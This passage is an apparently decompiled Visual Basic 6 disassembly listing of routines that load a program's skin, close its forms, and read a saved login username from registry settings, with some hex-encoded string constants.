008127EE: lea ecx, var_0000009C
008127F4: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
008127F9: mov var_04, 00000005h
00812800: cmp [008F529Ch], 00000000h
00812807: jnz 812824h
00812809: push 008F529Ch
0081280E: push 00440F2Ch
00812813: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
00812818: mov var_00000170, 008F529Ch
00812822: jmp 81282Eh
00812824: mov var_00000170, 008F529Ch
0081282E: mov eax, var_00000170
00812834: mov eax, [eax]
00812836: mov var_000000F8, eax
0081283C: lea eax, var_00000088
00812842: push eax
00812843: mov eax, var_000000F8
00812849: mov eax, [eax]
0081284B: push var_000000F8
00812851: call [eax+14h]
00812854: fclex 
00812856: mov var_000000FC, eax
0081285C: cmp var_000000FC, 00000000h
00812863: jnl 812885h
00812865: push 00000014h
00812867: push 00440F1Ch
0081286C: push var_000000F8
00812872: push var_000000FC
00812878: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0081287D: mov var_00000174, eax
00812883: jmp 81288Ch
00812885: and var_00000174, 00000000h
0081288C: mov eax, var_00000088
00812892: mov var_00000100, eax
00812898: lea eax, var_70
0081289B: push eax
0081289C: mov eax, var_00000100
008128A2: mov eax, [eax]
008128A4: push var_00000100
008128AA: call [eax+50h]
008128AD: fclex 
008128AF: mov var_00000104, eax
008128B5: cmp var_00000104, 00000000h
008128BC: jnl 8128DEh
008128BE: push 00000050h
008128C0: push 00440F3Ch
008128C5: push var_00000100
008128CB: push var_00000104
008128D1: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008128D6: mov var_00000178, eax
008128DC: jmp 8128E5h
008128DE: and var_00000178, 00000000h
008128E5: and word ptr var_000000F0, 0000h
008128ED: mov edx, 00445AC4h ; frmMain
008128F2: lea ecx, var_78
008128F5: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
008128FA: mov edx, 004464ECh ; 2E092C1508320213192C4F00000F
008128FF: lea ecx, var_74
00812902: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
00812907: push var_70
0081290A: lea eax, var_000000F0
00812910: push eax
00812911: lea eax, var_78
00812914: push eax
00812915: lea eax, var_74
00812918: push eax
00812919: call 007AA622h
0081291E: mov edx, eax
00812920: lea ecx, var_7C
00812923: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00812928: push eax
00812929: call 00410A18h ; &
0081292E: mov edx, eax
00812930: lea ecx, var_80
00812933: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00812938: push eax
00812939: call 007A5B65h
0081293E: mov edx, eax
00812940: lea ecx, var_48
00812943: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00812948: lea eax, var_80
0081294B: push eax
0081294C: lea eax, var_7C
0081294F: push eax
00812950: lea eax, var_70
00812953: push eax
00812954: lea eax, var_78
00812957: push eax
00812958: lea eax, var_74
0081295B: push eax
0081295C: push 00000005h
0081295E: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
00812963: add esp, 00000018h
00812966: lea ecx, var_00000088
0081296C: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00812971: mov var_04, 00000006h
00812978: push 0044652Ch ; wAzQ5d
0081297D: push var_48
00812980: call 007AAA41h
00812985: mov edx, eax
00812987: lea ecx, var_44
0081298A: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0081298F: mov var_04, 00000007h
00812996: mov var_000000C4, 00000001h
008129A0: mov var_000000CC, 00000002h
008129AA: mov var_000000D4, 00000023h
008129B4: mov var_000000DC, 00000002h
008129BE: mov var_000000E4, 00000001h
008129C8: mov var_000000EC, 00000002h
008129D2: lea eax, var_000000CC
008129D8: push eax
008129D9: lea eax, var_000000DC
008129DF: push eax
008129E0: lea eax, var_000000EC
008129E6: push eax
008129E7: lea eax, var_00000134
008129ED: push eax
008129EE: lea eax, var_00000124
008129F4: push eax
008129F5: lea eax, var_40
008129F8: push eax
008129F9: call 00410A3Ch ; For
008129FE: mov var_00000154, eax
00812A04: jmp 812A57h
00812A06: mov var_04, 00000008h
00812A0D: and var_000000F4, 00000000h
00812A14: lea eax, var_000000F4
00812A1A: push eax
00812A1B: push FFFFFFFFh
00812A1D: push FFFFFFFFh
00812A1F: lea eax, var_40
00812A22: push eax
00812A23: call 00410A90h ; msvbvm60.dll.__vbaI4Var
00812A28: push eax
00812A29: call 0043FFD8h
00812A2E: call 00410A54h ; msvbvm60.dll.__vbaSetSystemError
00812A33: mov var_04, 00000009h
00812A3A: lea eax, var_00000134
00812A40: push eax
00812A41: lea eax, var_00000124
00812A47: push eax
00812A48: lea eax, var_40
00812A4B: push eax
00812A4C: call 00410A36h ; Next
00812A51: mov var_00000154, eax
00812A57: cmp var_00000154, 00000000h
00812A5E: jnz 812A06h
00812A60: mov var_04, 0000000Ah
00812A67: lea eax, var_68
00812A6A: mov var_00000138, eax
00812A70: mov var_04, 0000000Bh
00812A77: cmp [008F529Ch], 00000000h
00812A7E: jnz 812A9Bh
00812A80: push 008F529Ch
00812A85: push 00440F2Ch
00812A8A: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
00812A8F: mov var_0000017C, 008F529Ch
00812A99: jmp 812AA5h
00812A9B: mov var_0000017C, 008F529Ch
00812AA5: mov eax, var_0000017C
00812AAB: mov eax, [eax]
00812AAD: mov var_000000F8, eax
00812AB3: lea eax, var_00000088
00812AB9: push eax
00812ABA: mov eax, var_000000F8
00812AC0: mov eax, [eax]
00812AC2: push var_000000F8
00812AC8: call [eax+14h]
00812ACB: fclex 
00812ACD: mov var_000000FC, eax
00812AD3: cmp var_000000FC, 00000000h
00812ADA: jnl 812AFCh
00812ADC: push 00000014h
00812ADE: push 00440F1Ch
00812AE3: push var_000000F8
00812AE9: push var_000000FC
00812AEF: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00812AF4: mov var_00000180, eax
00812AFA: jmp 812B03h
00812AFC: and var_00000180, 00000000h
00812B03: mov eax, var_00000088
00812B09: mov var_00000100, eax
00812B0F: lea eax, var_70
00812B12: push eax
00812B13: mov eax, var_00000100
00812B19: mov eax, [eax]
00812B1B: push var_00000100
00812B21: call [eax+50h]
00812B24: fclex 
00812B26: mov var_00000104, eax
00812B2C: cmp var_00000104, 00000000h
00812B33: jnl 812B55h
00812B35: push 00000050h
00812B37: push 00440F3Ch
00812B3C: push var_00000100
00812B42: push var_00000104
00812B48: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00812B4D: mov var_00000184, eax
00812B53: jmp 812B5Ch
00812B55: and var_00000184, 00000000h
00812B5C: push var_70
00812B5F: push 00442BDCh ; \data\skins\
00812B64: call 00410A18h ; &
00812B69: mov var_00000094, eax
00812B6F: mov var_0000009C, 00000008h
00812B79: mov var_000000D4, 00442BFCh
00812B83: mov var_000000DC, 00000008h
00812B8D: lea eax, var_0000009C
00812B93: push eax
00812B94: push 00000000h
00812B96: push 00453818h ; Text
00812B9B: lea eax, var_30
00812B9E: push eax
00812B9F: lea eax, var_000000AC
00812BA5: push eax
00812BA6: call 004107D8h ; msvbvm60.dll.__vbaVarLateMemCallLd
00812BAB: add esp, 00000010h
00812BAE: push eax
00812BAF: lea eax, var_000000BC
00812BB5: push eax
00812BB6: call 004109F4h ; msvbvm60.dll.__vbaVarCat
00812BBB: mov esi, eax
00812BBD: push 00000010h
00812BBF: pop eax
00812BC0: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00812BC5: mov edi, esp
00812BC7: movsd 
00812BC8: movsd 
00812BC9: movsd 
00812BCA: movsd 
00812BCB: push 00000010h
00812BCD: pop eax
00812BCE: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00812BD3: lea esi, var_000000DC
00812BD9: mov edi, esp
00812BDB: movsd 
00812BDC: movsd 
00812BDD: movsd 
00812BDE: movsd 
00812BDF: push 00000002h
00812BE1: push 00453824h ; LoadSkin
00812BE6: push var_00000138
00812BEC: call 004107D2h ; msvbvm60.dll.__vbaObjVar
00812BF1: push eax
00812BF2: call 004107E4h ; msvbvm60.dll.__vbaLateMemCall
00812BF7: add esp, 0000002Ch
00812BFA: lea ecx, var_70
00812BFD: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
00812C02: lea ecx, var_00000088
00812C08: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00812C0D: lea eax, var_000000BC
00812C13: push eax
00812C14: lea eax, var_000000AC
00812C1A: push eax
00812C1B: lea eax, var_0000009C
00812C21: push eax
00812C22: push 00000003h
00812C24: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00812C29: add esp, 00000010h
00812C2C: mov var_04, 0000000Ch
00812C33: lea eax, var_000000F4
00812C39: push eax
00812C3A: mov eax, [ebp+08h]
00812C3D: mov eax, [eax]
00812C3F: push [ebp+08h]
00812C42: call [eax+58h]
00812C45: fclex 
00812C47: mov var_000000F8, eax
00812C4D: cmp var_000000F8, 00000000h
00812C54: jnl 812C73h
00812C56: push 00000058h
00812C58: push 00443568h
00812C5D: push [ebp+08h]
00812C60: push var_000000F8
00812C66: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00812C6B: mov var_00000188, eax
00812C71: jmp 812C7Ah
00812C73: and var_00000188, 00000000h
00812C7A: mov eax, var_000000F4
00812C80: mov var_000000C4, eax
00812C86: mov var_000000CC, 00000003h
00812C90: push 00000010h
00812C92: pop eax
00812C93: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00812C98: lea esi, var_000000CC
00812C9E: mov edi, esp
00812CA0: movsd 
00812CA1: movsd 
00812CA2: movsd 
00812CA3: movsd 
00812CA4: push 00000001h
00812CA6: push 00453838h ; ApplyWindow
00812CAB: push var_00000138
00812CB1: call 004107D2h ; msvbvm60.dll.__vbaObjVar
00812CB6: push eax
00812CB7: call 004107E4h ; msvbvm60.dll.__vbaLateMemCall
00812CBC: add esp, 0000001Ch
00812CBF: mov var_04, 0000000Dh
00812CC6: and var_00000138, 00000000h
00812CCD: mov var_04, 0000000Eh
00812CD4: lea eax, var_000000F0
00812CDA: push eax
00812CDB: mov eax, [ebp+08h]
00812CDE: mov eax, [eax]
00812CE0: push [ebp+08h]
00812CE3: call [eax+00000720h]
00812CE9: mov var_000000F8, eax
00812CEF: cmp var_000000F8, 00000000h
00812CF6: jnl 812D18h
00812CF8: push 00000720h
00812CFD: push 0044391Ch
00812D02: push [ebp+08h]
00812D05: push var_000000F8
00812D0B: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00812D10: mov var_0000018C, eax
00812D16: jmp 812D1Fh
00812D18: and var_0000018C, 00000000h
00812D1F: movsx eax, word ptr var_000000F0
00812D26: test eax, eax
00812D28: jz 812D36h
00812D2A: mov var_04, 0000000Fh
00812D31: call 00410874h ; End
00812D36: mov var_04, 00000011h
00812D3D: mov eax, [ebp+08h]
00812D40: mov eax, [eax]
00812D42: push [ebp+08h]
00812D45: call [eax+00000314h]
00812D4B: push eax
00812D4C: lea eax, var_00000088
00812D52: push eax
00812D53: call 00410A84h ; Set (object)
00812D58: mov var_000000F8, eax
00812D5E: push FFFFFFFFh
00812D60: mov eax, var_000000F8
00812D66: mov eax, [eax]
00812D68: push var_000000F8
00812D6E: call [eax+5Ch]
00812D71: fclex 
00812D73: mov var_000000FC, eax
00812D79: cmp var_000000FC, 00000000h
00812D80: jnl 812DA2h
00812D82: push 0000005Ch
00812D84: push 00447A20h
00812D89: push var_000000F8
00812D8F: push var_000000FC
00812D95: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00812D9A: mov var_00000190, eax
00812DA0: jmp 812DA9h
00812DA2: and var_00000190, 00000000h
00812DA9: lea ecx, var_00000088
00812DAF: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00812DB4: mov var_04, 00000012h
00812DBB: mov eax, [ebp+08h]
00812DBE: mov eax, [eax]
00812DC0: push [ebp+08h]
00812DC3: call [eax+00000318h]
00812DC9: push eax
00812DCA: lea eax, var_00000088
00812DD0: push eax
00812DD1: call 00410A84h ; Set (object)
00812DD6: mov var_000000F8, eax
00812DDC: push FFFFFFFFh
00812DDE: mov eax, var_000000F8
00812DE4: mov eax, [eax]
00812DE6: push var_000000F8
00812DEC: call [eax+5Ch]
00812DEF: fclex 
00812DF1: mov var_000000FC, eax
00812DF7: cmp var_000000FC, 00000000h
00812DFE: jnl 812E20h
00812E00: push 0000005Ch
00812E02: push 00447A20h
00812E07: push var_000000F8
00812E0D: push var_000000FC
00812E13: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00812E18: mov var_00000194, eax
00812E1E: jmp 812E27h
00812E20: and var_00000194, 00000000h
00812E27: lea ecx, var_00000088
00812E2D: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00812E32: mov var_10, 00000000h
00812E39: push 00812EFFh
00812E3E: jmp 812E9Dh
00812E40: lea eax, var_00000084
00812E46: push eax
00812E47: lea eax, var_80
00812E4A: push eax
00812E4B: lea eax, var_7C
00812E4E: push eax
00812E4F: lea eax, var_78
00812E52: push eax
00812E53: lea eax, var_74
00812E56: push eax
00812E57: lea eax, var_70
00812E5A: push eax
00812E5B: push 00000006h
00812E5D: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
00812E62: add esp, 0000001Ch
00812E65: lea eax, var_0000008C
00812E6B: push eax
00812E6C: lea eax, var_00000088
00812E72: push eax
00812E73: push 00000002h
00812E75: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00812E7A: add esp, 0000000Ch
00812E7D: lea eax, var_000000BC
00812E83: push eax
00812E84: lea eax, var_000000AC
00812E8A: push eax
00812E8B: lea eax, var_0000009C
00812E91: push eax
00812E92: push 00000003h
00812E94: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00812E99: add esp, 00000010h
00812E9C: ret 
End Sub

Private sub Form__813363
00813363: push ebp
00813364: mov ebp, esp
00813366: sub esp, 0000000Ch
00813369: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
0081336E: mov eax, fs:[00h]
00813374: push eax
00813375: mov fs:[00000000h], esp
0081337C: push 0000001Ch
0081337E: pop eax
0081337F: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00813384: push ebx
00813385: push esi
00813386: push edi
00813387: mov var_0C, esp
0081338A: mov var_08, 0040AA20h
00813391: mov eax, [ebp+08h]
00813394: and eax, 00000001h
00813397: mov var_04, eax
0081339A: mov eax, [ebp+08h]
0081339D: and al, FEh
0081339F: mov [ebp+08h], eax
008133A2: mov eax, [ebp+08h]
008133A5: mov eax, [eax]
008133A7: push [ebp+08h]
008133AA: call [eax+04h]
008133AD: push 00000000h
008133AF: push 00000046h
008133B1: mov eax, [ebp+08h]
008133B4: mov eax, [eax]
008133B6: push [ebp+08h]
008133B9: call [eax+00000330h]
008133BF: push eax
008133C0: lea eax, var_18
008133C3: push eax
008133C4: call 00410A84h ; Set (object)
008133C9: push eax
008133CA: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
008133CF: add esp, 0000000Ch
008133D2: lea ecx, var_18
008133D5: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008133DA: cmp [008F529Ch], 00000000h
008133E1: jnz 8133FBh
008133E3: push 008F529Ch
008133E8: push 00440F2Ch
008133ED: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008133F2: mov var_2C, 008F529Ch
008133F9: jmp 813402h
008133FB: mov var_2C, 008F529Ch
00813402: mov eax, var_2C
00813405: mov eax, [eax]
00813407: mov var_1C, eax
0081340A: push [ebp+08h]
0081340D: lea eax, var_18
00813410: push eax
00813411: call 004108E0h ; msvbvm60.dll.__vbaObjSetAddref
00813416: push eax
00813417: mov eax, var_1C
0081341A: mov eax, [eax]
0081341C: push var_1C
0081341F: call [eax+10h]
00813422: fclex 
00813424: mov var_20, eax
00813427: cmp var_20, 00000000h
0081342B: jnl 813444h
0081342D: push 00000010h
0081342F: push 00440F1Ch
00813434: push var_1C
00813437: push var_20
0081343A: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0081343F: mov var_30, eax
00813442: jmp 813448h
00813444: and var_30, 00000000h
00813448: lea ecx, var_18
0081344B: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00813450: call 00410874h ; End
00813455: mov var_04, 00000000h
0081345C: push 0081346Dh
00813461: jmp 81346Ch
00813463: lea ecx, var_18
00813466: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0081346B: ret 
End Sub

Private sub Form__813111
00813111: push ebp
00813112: mov ebp, esp
00813114: sub esp, 0000000Ch
00813117: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
0081311C: mov eax, fs:[00h]
00813122: push eax
00813123: mov fs:[00000000h], esp
0081312A: push 0000001Ch
0081312C: pop eax
0081312D: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00813132: push ebx
00813133: push esi
00813134: push edi
00813135: mov var_0C, esp
00813138: mov var_08, 0040AA00h
0081313F: mov eax, [ebp+08h]
00813142: and eax, 00000001h
00813145: mov var_04, eax
00813148: mov eax, [ebp+08h]
0081314B: and al, FEh
0081314D: mov [ebp+08h], eax
00813150: mov eax, [ebp+08h]
00813153: mov eax, [eax]
00813155: push [ebp+08h]
00813158: call [eax+04h]
0081315B: push 00000000h
0081315D: push 00000046h
0081315F: mov eax, [ebp+08h]
00813162: mov eax, [eax]
00813164: push [ebp+08h]
00813167: call [eax+00000330h]
0081316D: push eax
0081316E: lea eax, var_18
00813171: push eax
00813172: call 00410A84h ; Set (object)
00813177: push eax
00813178: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
0081317D: add esp, 0000000Ch
00813180: lea ecx, var_18
00813183: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00813188: cmp [008F529Ch], 00000000h
0081318F: jnz 8131A9h
00813191: push 008F529Ch
00813196: push 00440F2Ch
0081319B: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008131A0: mov var_2C, 008F529Ch
008131A7: jmp 8131B0h
008131A9: mov var_2C, 008F529Ch
008131B0: mov eax, var_2C
008131B3: mov eax, [eax]
008131B5: mov var_1C, eax
008131B8: push [ebp+08h]
008131BB: lea eax, var_18
008131BE: push eax
008131BF: call 004108E0h ; msvbvm60.dll.__vbaObjSetAddref
008131C4: push eax
008131C5: mov eax, var_1C
008131C8: mov eax, [eax]
008131CA: push var_1C
008131CD: call [eax+10h]
008131D0: fclex 
008131D2: mov var_20, eax
008131D5: cmp var_20, 00000000h
008131D9: jnl 8131F2h
008131DB: push 00000010h
008131DD: push 00440F1Ch
008131E2: push var_1C
008131E5: push var_20
008131E8: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008131ED: mov var_30, eax
008131F0: jmp 8131F6h
008131F2: and var_30, 00000000h
008131F6: lea ecx, var_18
008131F9: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008131FE: call 00410874h ; End
00813203: mov var_04, 00000000h
0081320A: push 0081321Bh
0081320F: jmp 81321Ah
00813211: lea ecx, var_18
00813214: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00813219: ret 
End Sub

Private sub Form__81323A
0081323A: push ebp
0081323B: mov ebp, esp
0081323D: sub esp, 0000000Ch
00813240: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
00813245: mov eax, fs:[00h]
0081324B: push eax
0081324C: mov fs:[00000000h], esp
00813253: push 0000001Ch
00813255: pop eax
00813256: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0081325B: push ebx
0081325C: push esi
0081325D: push edi
0081325E: mov var_0C, esp
00813261: mov var_08, 0040AA10h
00813268: mov eax, [ebp+08h]
0081326B: and eax, 00000001h
0081326E: mov var_04, eax
00813271: mov eax, [ebp+08h]
00813274: and al, FEh
00813276: mov [ebp+08h], eax
00813279: mov eax, [ebp+08h]
0081327C: mov eax, [eax]
0081327E: push [ebp+08h]
00813281: call [eax+04h]
00813284: push 00000000h
00813286: push 00000046h
00813288: mov eax, [ebp+08h]
0081328B: mov eax, [eax]
0081328D: push [ebp+08h]
00813290: call [eax+00000330h]
00813296: push eax
00813297: lea eax, var_18
0081329A: push eax
0081329B: call 00410A84h ; Set (object)
008132A0: push eax
008132A1: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
008132A6: add esp, 0000000Ch
008132A9: lea ecx, var_18
008132AC: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008132B1: cmp [008F529Ch], 00000000h
008132B8: jnz 8132D2h
008132BA: push 008F529Ch
008132BF: push 00440F2Ch
008132C4: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
008132C9: mov var_2C, 008F529Ch
008132D0: jmp 8132D9h
008132D2: mov var_2C, 008F529Ch
008132D9: mov eax, var_2C
008132DC: mov eax, [eax]
008132DE: mov var_1C, eax
008132E1: push [ebp+08h]
008132E4: lea eax, var_18
008132E7: push eax
008132E8: call 004108E0h ; msvbvm60.dll.__vbaObjSetAddref
008132ED: push eax
008132EE: mov eax, var_1C
008132F1: mov eax, [eax]
008132F3: push var_1C
008132F6: call [eax+10h]
008132F9: fclex 
008132FB: mov var_20, eax
008132FE: cmp var_20, 00000000h
00813302: jnl 81331Bh
00813304: push 00000010h
00813306: push 00440F1Ch
0081330B: push var_1C
0081330E: push var_20
00813311: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00813316: mov var_30, eax
00813319: jmp 81331Fh
0081331B: and var_30, 00000000h
0081331F: lea ecx, var_18
00813322: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00813327: call 00410874h ; End
0081332C: mov var_04, 00000000h
00813333: push 00813344h
00813338: jmp 813343h
0081333A: lea ecx, var_18
0081333D: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00813342: ret 
End Sub

Private sub Timer2__8140B2
008140B2: push ebp
008140B3: mov ebp, esp
008140B5: sub esp, 0000000Ch
008140B8: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
008140BD: mov eax, fs:[00h]
008140C3: push eax
008140C4: mov fs:[00000000h], esp
008140CB: push 00000064h
008140CD: pop eax
008140CE: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008140D3: push ebx
008140D4: push esi
008140D5: push edi
008140D6: mov var_0C, esp
008140D9: mov var_08, 0040AAF8h
008140E0: mov eax, [ebp+08h]
008140E3: and eax, 00000001h
008140E6: mov var_04, eax
008140E9: mov eax, [ebp+08h]
008140EC: and al, FEh
008140EE: mov [ebp+08h], eax
008140F1: mov eax, [ebp+08h]
008140F4: mov eax, [eax]
008140F6: push [ebp+08h]
008140F9: call [eax+04h]
008140FC: and word ptr var_40, 0000h
00814101: mov edx, 00445AC4h ; frmMain
00814106: lea ecx, var_1C
00814109: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
0081410E: mov edx, 00445A90h ; 10012C02021D0E13092812
00814113: lea ecx, var_18
00814116: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
0081411B: lea eax, var_40
0081411E: push eax
0081411F: lea eax, var_1C
00814122: push eax
00814123: lea eax, var_18
00814126: push eax
00814127: call 007AA622h
0081412C: mov edx, eax
0081412E: lea ecx, var_28
00814131: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00814136: mov var_34, 80020004h
0081413D: mov var_3C, 0000000Ah
00814144: mov eax, var_28
00814147: mov var_54, eax
0081414A: and var_28, 00000000h
0081414E: push 00000010h
00814150: pop eax
00814151: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00814156: lea esi, var_3C
00814159: mov edi, esp
0081415B: movsd 
0081415C: movsd 
0081415D: movsd 
0081415E: movsd 
0081415F: push 00446744h ; Username
00814164: push 0044D744h ; Login
00814169: mov edx, var_54
0081416C: lea ecx, var_20
0081416F: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00814174: push eax
00814175: call 0041085Ch ; GetSetting(arg_1,arg_2,arg_3,arg_4)
0081417A: mov edx, eax
0081417C: lea ecx, var_24
0081417F: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00814184: push eax
00814185: push 00000000h
00814187: call 00410A00h ; msvbvm60.dll.__vbaStrCmp
0081418C: neg eax
0081418E: sbb eax, eax
00814190: neg eax
00814192: neg eax
00814194: mov var_44, ax
00814198: lea eax, var_28
0081419B: push eax
0081419C: lea eax, var_24
0081419F: push eax
008141A0: lea eax, var_20
008141A3: push eax
008141A4: lea eax, var_1C
008141A7: push eax
008141A8: lea eax, var_18
008141AB: push eax
008141AC: push 00000005h
008141AE: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008141B3: add esp, 00000018h
008141B6: movsx eax, word ptr var_44
008141BA: test eax, eax
008141BC: jz 00814378h
008141C2: and word ptr var_40, 0000h
008141C7: mov edx, 00445AC4h ; frmMain
008141CC: lea ecx, var_1C
008141CF: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
008141D4: mov edx, 00445A90h ; 10012C02021D0E13092812
008141D9: lea ecx, var_18
008141DC: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
008141E1: lea eax, var_40
008141E4: push eax
008141E5: lea eax, var_1C
008141E8: push eax
008141E9: lea eax, var_18
008141EC: push eax
008141ED: call 007AA622h
008141F2: mov edx, eax
008141F4: lea ecx, var_28
008141F7: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008141FC: mov eax, [ebp+08h]
008141FF: mov eax, [eax]
00814201: push [ebp+08h]
00814204: call [eax+00000308h]
0081420A: push eax
0081420B: lea eax, var_2C
0081420E: push eax
0081420F: call 00410A84h ; Set (object)
00814214: mov var_44, eax
00814217: mov var_34, 80020004h
0081421E: mov var_3C, 0000000Ah
00814225: mov eax, var_28
00814228: mov var_58, eax
0081422B: and var_28, 00000000h
0081422F: push 00000010h
00814231: pop eax
00814232: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00814237: lea esi, var_3C
0081423A: mov edi, esp
0081423C: movsd 
0081423D: movsd 
0081423E: movsd 
0081423F: movsd 
00814240: push 00446744h ; Username
00814245: push 0044D744h ; Login
0081424A: mov edx, var_58
0081424D: lea ecx, var_20
00814250: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00814255: push eax
00814256: call 0041085Ch ; GetSetting(arg_1,arg_2,arg_3,arg_4)
0081425B: mov edx, eax
0081425D: lea ecx, var_24
00814260: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00814265: push eax
00814266: mov eax, var_44
00814269: mov eax, [eax]
0081426B: push var_44
0081426E: call [eax+000000A4h]
00814274: fclex 
00814276: mov var_48, eax
00814279: cmp var_48, 00000000h
0081427D: jnl 814299h
0081427F: push 000000A4h
00814284: push 00440E08h
00814289: push var_44
0081428C: push var_48
0081428F: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00814294: mov var_60, eax
00814297: jmp 81429Dh
00814299: and var_60, 00000000h
0081429D: lea eax, var_28
008142A0: push eax
008142A1: lea eax, var_24
008142A4: push eax
008142A5: lea eax, var_20
008142A8: push eax
008142A9: lea eax, var_1C
008142AC: push eax
008142AD: lea eax, var_18
008142B0: push eax
008142B1: push 00000005h
008142B3: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008142B8: add esp, 00000018h
008142BB: lea ecx, var_2C
008142BE: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008142C3: mov eax, [ebp+08h]
008142C6: mov eax, [eax]
008142C8: push [ebp+08h]
008142CB: call [eax+00000300h]
008142D1: push eax
008142D2: lea eax, var_2C
008142D5: push eax
008142D6: call 00410A84h ; Set (object)
008142DB: mov var_44, eax
008142DE: push 00000001h
008142E0: mov eax, var_44
008142E3: mov eax, [eax]
008142E5: push var_44
008142E8: call [eax+000000E4h]
008142EE: fclex 
008142F0: mov var_48, eax
008142F3: cmp var_48, 00000000h
008142F7: jnl 814313h
008142F9: push 000000E4h
008142FE: push 00440DF8h
00814303: push var_44
00814306: push var_48
00814309: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0081430E: mov var_64, eax
00814311: jmp 814317h
00814313: and var_64, 00000000h
00814317: lea ecx, var_2C
0081431A: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0081431F: mov eax, [ebp+08h]
00814322: mov eax, [eax]
00814324: push [ebp+08h]
00814327: call [eax+0000031Ch]
0081432D: push eax
0081432E: lea eax, var_2C
00814331: push eax
00814332: call 00410A84h ; Set (object)
00814337: mov var_44, eax
0081433A: push 004539FCh ; Status: Username loaded
0081433F: mov eax, var_44
00814342: mov eax, [eax]
00814344: push var_44
00814347: call [eax+54h]
0081434A: fclex 
0081434C: mov var_48, eax
0081434F: cmp var_48, 00000000h
00814353: jnl 81436Ch
00814355: push 00000054h
00814357: push 004425E4h
0081435C: push var_44
0081435F: push var_48
00814362: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00814367: mov var_68, eax
0081436A: jmp 814370h
0081436C: and var_68, 00000000h
00814370: lea ecx, var_2C
00814373: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00814378: and word ptr var_40, 0000h
0081437D: mov edx, 00445AC4h ; frmMain
00814382: lea ecx, var_1C
00814385: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
0081438A: mov edx, 00445A90h ; 10012C02021D0E13092812
0081438F: lea ecx, var_18
00814392: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
00814397: lea eax, var_40
0081439A: push eax
0081439B: lea eax, var_1C
0081439E: push eax
0081439F: lea eax, var_18
008143A2: push eax
008143A3: call 007AA622h
008143A8: mov edx, eax
008143AA: lea ecx, var_28
008143AD: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008143B2: mov var_34, 80020004h
008143B9: mov var_3C, 0000000Ah
008143C0: mov eax, var_28
008143C3: mov var_5C, eax
008143C6: and var_28, 00000000h
